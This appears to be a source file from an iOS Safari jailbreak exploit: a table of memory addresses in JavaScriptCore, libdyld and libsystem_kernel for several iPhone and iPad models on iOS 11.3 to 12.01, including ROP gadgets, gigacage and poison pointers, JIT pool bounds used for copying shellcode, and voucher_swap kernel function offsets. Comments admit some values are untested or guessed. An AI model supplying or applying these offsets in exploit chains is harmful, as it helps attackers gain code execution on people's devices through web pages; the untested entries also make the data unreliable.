/*
    To find ModelIO popx8:
    Use radare: "/c ldr x8, [sp, 0x28]; ldr x0, [x8, 0x18]; ldp x29, x30, [sp, 0x50]; add sp, sp, 0x60; ret"
*/

var kOFFUnknown = 0x0;

//Class for finding offsets by software version and product name
//This may have to be updated one day when offsets become specific between different models with the same product name
var Offsets = function Offsets(sw_vers, productname) {
    
    var offsets = []; //This class uses a tree-based structure as it has been proven to be the fastest for lookups.
    
    //iPhones
    offsets["iPhone 2G"] = [];
    offsets["iPhone 3G"] = [];
    offsets["iPhone 3GS"] = [];
    offsets["iPhone 4"] = [];
    offsets["iPhone 4S"] = [];
    offsets["iPhone 5"] = [];
    offsets["iPhone 5C"] = [];
    offsets["iPhone 5S"] = [];
    offsets["iPhone 6"] = [];
    offsets["iPhone 6+"] = [];
    offsets["iPhone 6S"] = [];
    offsets["iPhone 6S+"] = [];
    offsets["iPhone SE"] = [];
    offsets["iPhone 7"] = [];
    offsets["iPhone 7+"] = [];
    offsets["iPhone 8"] = [];
    offsets["iPhone 8+"] = [];
    offsets["iPhone X"] = [];
    offsets["iPhone XS"] = [];
    offsets["iPhone XR"] = [];
    
    //iPads
    offsets["iPad Air"] = [];
    
    //iPad Air
    offsets["iPad Air"][11.31] = {
        padding: 0x18,
        vtable: 0x189c9a808,
        disableprimitivegigacage: 0x18851a7d4,
        callbacks: 0x1b2b99698,
        g_gigacagebaseptrs: 0x1b1624000,
        g_typedarraypoisons: 0x1b2b99720,
        longjmp: 0x180b12778,
        dlsym: 0x18084ef90,
        startfixedmempool: 0x1b2b990b8,
        endfixedmempool: 0x1b2b990c0,
        jit_writeseperateheaps_func: 0x1b2b990c8,
        usefastpermissions_jitcopy: 0x1b1620018,
        ptr_stack_check_guard: 0x1b2af3ef8,
        modelio_popx8: kOFFUnknown,
        coreaudio_popx2: kOFFUnknown,
        linkcode_gadget: kOFFUnknown
    };
    
    //iPhone 5S
    offsets["iPhone 5S"][11.31] = {
        padding: 0x18,
        vtable: 0x189c9a808,
        disableprimitivegigacage: 0x18851a7d4,
        callbacks: 0x1b3199698,
        g_gigacagebaseptrs: 0x1b1bec000,
        g_typedarraypoisons: 0x1b3199720,
        longjmp: 0x180b12778,
        dlsym: 0x18084ef90,
        startfixedmempool: 0x1b31990b8,
        endfixedmempool: 0x1b31990c0,
        jit_writeseperateheaps_func: 0x1b31990c8,
        usefastpermissions_jitcopy: 0x1b1be8018,
        ptr_stack_check_guard: 0x1b30f1ef8,
        modelio_popx8: kOFFUnknown,
        coreaudio_popx2: kOFFUnknown,
        linkcode_gadget: kOFFUnknown
    };

    //iPhone 6
    offsets["iPhone 6"][11.31] = {
        padding: 0x18,
        vtable: 0x189c9a808,
        disableprimitivegigacage: 0x18851a7d4,
        callbacks: 0x1b31a1698,
        g_gigacagebaseptrs: 0x1b1bf4000,
        g_typedarraypoisons: 0x1b31a1720,
        longjmp: 0x180b12778,
        dlsym: 0x18084ef90,
        startfixedmempool: 0x1b31a10b8,
        endfixedmempool: 0x1b31a10c0,
        jit_writeseperateheaps_func: 0x1b31a10c8,
        usefastpermissions_jitcopy: 0x1b1bf0018,
        ptr_stack_check_guard: 0x1b30f9ef8,
        modelio_popx8: kOFFUnknown,
        coreaudio_popx2: kOFFUnknown,
        linkcode_gadget: kOFFUnknown
    };
    
    //iPhone 6+
    // Note: No need for gigacage related offsets for this device.
    // These work on my device.
    offsets["iPhone 6+"][11.31] = {
        padding: 0x18,
        vtable: 0x189c9a808,
        disableprimitivegigacage: kOFFUnknown,
        callbacks: 0x1b319fd28,
        g_gigacagebaseptrs: kOFFUnknown,
        g_typedarraypoisons: 0x1b31a1720,
        longjmp: 0x180b126e8,
        dlsym: 0x18084ef90,
        startfixedmempool: 0x1b31a10b8,
        endfixedmempool: 0x1b31a10c0,
        jit_writeseperateheaps_func: 0x1b31a10c8,
        usefastpermissions_jitcopy: 0x1b1bf0018,
        ptr_stack_check_guard: 0x1ac2f7c40,
        modelio_popx8: 0x18d2f6564,
        coreaudio_popx2: 0x18409ddbc,
        linkcode_gadget: 0x187bd187c
    };
    
    //iPhone 6S
    // Note: No need for gigacage related offsets for this device, but added them anyway.
    // TODO: Test offsets.
    offsets["iPhone 6S"][11.31] = {
        padding: 0x18,
        vtable: 0x189c9a808,
        disableprimitivegigacage: 0x18851a7d4,
        callbacks: 0x1b31a1698,
        g_gigacagebaseptrs: 0x1b1bf4000,
        g_typedarraypoisons: 0x1b31a1720,
        longjmp: 0x180b12778,
        dlsym: 0x18084ef90,
        startfixedmempool: 0x1b31a10b8,
        endfixedmempool: 0x1b31a10c0,
        jit_writeseperateheaps_func: 0x1b31a10c8,
        usefastpermissions_jitcopy: 0x1b1bf0018,
        ptr_stack_check_guard: 0x1b30f9ef8,
        modelio_popx8: 0x18d2f6574,
        coreaudio_popx2: 0x18409ddbc,
        linkcode_gadget: 0x187bd187c 
    };
    
    //iPhone 6S+
    offsets["iPhone 6S+"][11.31] = offsets["iPhone 6S"][11.31];
    
    //iPhone 7
    offsets["iPhone 7"][11.31] = {
        padding: 0x18,
        vtable: 0x189c9a808,
        disableprimitivegigacage: 0x18851a7d4,
        callbacks: 0x1b335d698,
        g_gigacagebaseptrs: 0x1b1d08000,
        g_typedarraypoisons: 0x1b335d720,
        longjmp: 0x180b12778,
        dlsym: 0x18084ef90,
        startfixedmempool: 0x1b335d0b8,
        endfixedmempool: 0x1b335d0c0,
        jit_writeseperateheaps_func: 0x1b335d0c8,
        usefastpermissions_jitcopy: 0x1b1d04018,
        ptr_stack_check_guard: 0x1b32b7ef8,
        modelio_popx8: 0x18d2f6564, 
        coreaudio_popx2: 0x18409ddbc,
        linkcode_gadget: 0x187bd1204 
    };
    
    //iPhone 7+
    offsets["iPhone 7+"][11.31] = {
        padding: 0x18,
        vtable: 0x189c9a808,
        disableprimitivegigacage: 0x18851a7d4,
        g_gigacagebaseptrs: 0x1b1d08000,
        g_typedarraypoisons: 0x1b335d720,
        dlsym: 0x18084ef90,
        startfixedmempool: 0x1b335d0b8,
        endfixedmempool: 0x1b335d0c0,
        jit_writeseperateheaps_func: 0x1b335d0c8,
        usefastpermissions_jitcopy: 0x1b1d04018,
        ptr_stack_check_guard: 0x1b32b7ef8,
        dlsym: 0x18084ef90,
        longjmp: 0x180b12778,
        callbacks: 0x1b335d698,
        modelio_popx8: kOFFUnknown, 
        coreaudio_popx2: kOFFUnknown,
        linkcode_gadget: kOFFUnknown
    };
    
    //iPhone 8
    offsets["iPhone 8"][11.31] = {
        padding: 0x20,
        vtable: 0x189c9a808,
        disableprimitivegigacage: 0x18851a7d4,
        callbacks: 0x1b335bd28,
        g_gigacagebaseptrs: 0x1b1d08000,
        g_typedarraypoisons: 0x1b335d720,
        longjmp: 0x180b126e8,
        dlsym: 0x18084ef90,
        startfixedmempool: 0x1b335d0b8,
        endfixedmempool: 0x1b335d0c0,
        jit_writeseperateheaps_func: 0x1b335d0c8,
        usefastpermissions_jitcopy: 0x1b1d04018,
        ptr_stack_check_guard: 0x1ac3efc40,
        modelio_popx8: 0x18d2f6564,
        coreaudio_popx2: 0x18409ddbc,
        linkcode_gadget: 0x187bd18c8
    };
    
    //iPhone 8+
    offsets["iPhone 8+"][11.31] = {
        padding: 0x20,
        vtable: 0x189c9a808,
        disableprimitivegigacage: 0x18851a7d4,
        callbacks: 0x1b335d698,
        g_gigacagebaseptrs: 0x1b1d08000,
        g_typedarraypoisons: 0x1b335d720,
        longjmp: 0x180b126e8,
        dlsym: 0x18084ef90,
        startfixedmempool: 0x1b335d0b8,
        endfixedmempool: 0x1b335d0c0,
        jit_writeseperateheaps_func: 0x1b335d0c8,
        usefastpermissions_jitcopy: 0x1b1d04018,
        ptr_stack_check_guard: 0x1ac3efc40,
        
        //Asuming these are correct, just copied from the i8
        modelio_popx8: 0x18d2f6564,
        coreaudio_popx2: 0x18409ddbc,
        linkcode_gadget: 0x187bd18c8
    };
    
    //iPhone X
    offsets["iPhone X"][11.31] = {
        padding: 0x20,
        vtable: 0x189c9a808,
        disableprimitivegigacage: 0x18851a7d4,
        g_gigacagebaseptrs: 0x1b1cb0000,
        g_typedarraypoisons: 0x1b3281720,
        startfixedmempool: 0x1b32810b8,
        endfixedmempool: 0x1b32810c0,
        jit_writeseperateheaps_func: 0x1b32810c8,
        usefastpermissions_jitcopy: 0x1b1cac018,
        ptr_stack_check_guard: 0x1b31dcef8,
        dlsym: 0x18084ef90,
        longjmp: 0x180b12778,
        callbacks: 0x1b3281698,
        modelio_popx8: 0x18d2f6564,
        coreaudio_popx2: 0x18409ddbc,
        linkcode_gadget: 0x187bd18c8
    };

    offsets["iPhone SE"][11.41] = {
        padding: 0x20,
        vtable: kOFFUnknown,
        disableprimitivegigacage: 0x18854ca8c,
        g_gigacagebaseptrs: 0x1b1d6c000,
        g_typedarraypoisons: 0x1b3325728,
        startfixedmempool: 0x1b33250b8,
        endfixedmempool: 0x1b33250c0,
        jit_writeseperateheaps_func: 0x1b33250c8,
        usefastpermissions_jitcopy: 0x1b1d68018,
        ptr_stack_check_guard: 0x1b327fef8,
        dlsym: 0x18084ef90,
        longjmp: 0x180b126e8,
        callbacks: 0x1b33256a0,
        modelio_popx8: kOFFUnknown,
        coreaudio_popx2: kOFFUnknown,
        linkcode_gadget: 0x187bf2fb4
    };
    
    offsets["iPhone 6"][11.41] = {
        vtable: kOFFUnknown,
        disableprimitivegigacage: 0x18854aa90,
        g_gigacagebaseptrs: 0x1b1d58000,
        g_typedarraypoisons: 0x1b3311728,
        startfixedmempool: 0x1b33110b8,
        endfixedmempool: 0x1b33110c0,
        jit_writeseperateheaps_func: 0x1b33110c8,
        usefastpermissions_jitcopy: 0x1b1d54018,
        ptr_stack_check_guard: 0x1b326bef8,
        dlsym: 0x18084ef90,
        longjmp: 0x180b12778,
        callbacks: 0x1b33116a0,
        modelio_popx8: kOFFUnknown,
        linkcode_gadget: kOFFUnknown
    };
    
    offsets["iPhone 6S"][12.01] = {
    	nativejitcode: 0x18887fb34, 				// JSC::NativeJITCode::~NativeJITCode() from JavaScriptCore
        vtable: 0x1B1C95048, 						// HTMLDivElement vtable from JavaScriptCore
        dlopen: 0x180923bb8, 						// From libdyld.dylib (For @5aelo's new mach-o approach)
        confstr: 0x18096fa10, 						// From libsystem_c.dylib (For @5aelo's new mach-o approach)
        disableprimitivegigacage: 0x1881CBF54, 		// From JavaScriptCore 
        g_gigacagebaseptrs: 0x1B80EC000, 			// From JavaScriptCore 
      	g_jsarraybufferpoison: 0x1B80F01A0, 		// From JavaScriptCore (For XOR with leaked buffer)
      	g_jitcodepoison: 0x1B80F0190, 				// From JavaScriptCore (For XOR with leaked code)
        g_typedarraypoisons: kOFFUnknown, 			// Removed as of iOS 11.4 
        startfixedmempool: 0x1BA0610C0, 			// From JavaScriptCore (For copying shellcode)
        endfixedmempool: 0x1BA0610C8, 				// From JavaScriptCore (For copying shellcode)
        jit_writeseperateheaps_func: 0x1BA0610D0,	// From JavaScriptCore (For detecting < i8)
        usefastpermissions_jitcopy: 0x1b80f0018,	// From JavaScriptCore (For detecting i8 and up)
        ptr_stack_check_guard: 0x1b9fa9a18,			// To make our JITMemCpy work
        dlsym: 0x180923d64,							// For our shellcode + linkage
        longjmp: 0x180adc598,					
        callbacks: 0x1b80f01a8,
        modelio_popx8: kOFFUnknown,					// For our Return Oriented Programming chain
        jscbase: 0x188174000,						// _TEXT segment of JavaScriptCore
        linkcode_gadget: 0x188214890,				// From JavaScriptCore
        dyld_shared_cache: 0x180000000,				// Just so we can parse any mach-o if we would want to or find gadgets
        thread_swap_mach_voucher: 0x180A5F2D0,		// From libsystem_kernel.dylib (For voucher_swap)
        task_set_mach_voucher: 0x180A5C0AC, 			// From libsystem_kernel.dylib (For voucher_swap)
        task_get_mach_voucher: 0x180A5BF64			// From libsystem_kernel.dylib (For voucher_swap)
    };
    
    offsets["iPhone SE"][12.01] = {
        vtable: 0x23b419058,
        disableprimitivegigacage: 0x1881cbf54,
        g_gigacagebaseptrs: 0x1b80e4000,
        g_typedarraypoisons: kOFFUnknown,
        startfixedmempool: kOFFUnknown,
        endfixedmempool: kOFFUnknown,
        jit_writeseperateheaps_func: 0x1ba0590d0,
        usefastpermissions_jitcopy: 0x1b80e8018,
        ptr_stack_check_guard: 0x1b9fa1a18,
        dlsym: 0x180923d64,
        longjmp: 0x180adc630,
        callbacks: 0x1b80e81a8,
        modelio_popx8: kOFFUnknown, /*This is modelio base in UFO finder idk if it is correct*/
        linkcode_gadget: kOFFUnknown, //Thanks to ivanhrabcak to finding these.
    };

    offsets["iPhone 7"][12.01] = {
        vtable: kOFFUnknown,
        disableprimitivegigacage:0x18854ca8c,
        g_gigacagebaseptrs: 0x1b1f64000,
        g_typedarraypoisons: 0x1b35c9728,
        startfixedmempool: 0x1b35c90b8,
        endfixedmempool: 0x1b35c90c0,
        jit_writeseperateheaps_func: 0x1b35c90c8,
        usefastpermissions_jitcopy: 0x1b1f60018,
        ptr_stack_check_guard: 0x1b3522ef8,
        dlsym: 0x18084ef90,
        longjmp: 0x180b126e8,
        callbacks: 0x1b35c96a0,
        modelio_popx8: kOFFUnknown,
        linkcode_gadget: 0x187bf2fb4
    };
    
    offsets["iPhone 8+"][12.01] = {
        vtable: 0x1c6c19058,
        disableprimitivegigacage: 0x1881cbf54,
        g_gigacagebaseptrs: 0x1b8918000,
        g_typedarraypoisons: kOFFUnknown,
        startfixedmempool: kOFFUnknown,
        endfixedmempool: kOFFUnknown,
        jit_writeseperateheaps_func: 0x1babad0d0,
        usefastpermissions_jitcopy: 0x1b891c018,
        ptr_stack_check_guard: 0x1baaf6a18,
        dlsym: 0x180923d64,
        longjmp: 0x180adc630,
        callbacks: 0x1b891c1a8,
        modelio_popx8: kOFFUnknown,
        linkcode_gadget: kOFFUnknown
    };

    //fixing up offsets that are the same accross devices, without having to allocate more memory for them.
    offsets["iPhone 5S"][11.3] = offsets["iPhone 5S"][11.31];
    offsets["iPhone 6"][11.3] = offsets["iPhone 6"][11.31];
    offsets["iPhone 6+"][11.3] = offsets["iPhone 6+"][11.31];
    offsets["iPhone 6S"][11.3] = offsets["iPhone 6S"][11.31];
    offsets["iPhone 6S+"][11.3] = offsets["iPhone 6S"][11.31];
    offsets["iPhone 7"][11.3] = offsets["iPhone 7"][11.31];
    offsets["iPhone 7+"][11.3] = offsets["iPhone 7+"][11.31];
    offsets["iPhone 8"][11.3] = offsets["iPhone 8"][11.31];
    offsets["iPhone 8+"][11.3] = offsets["iPhone 8+"][11.31];
    offsets["iPhone X"][11.3] = offsets["iPhone X"][11.31];
    
    offsets["iPad Air"][11.3] = offsets["iPad Air"][11.31];
    
    if(offsets[productname] !== undefined) {
        if(offsets[productname][sw_vers] !== undefined) {
            return offsets[productname][sw_vers];
        }
    }
    return false;
};
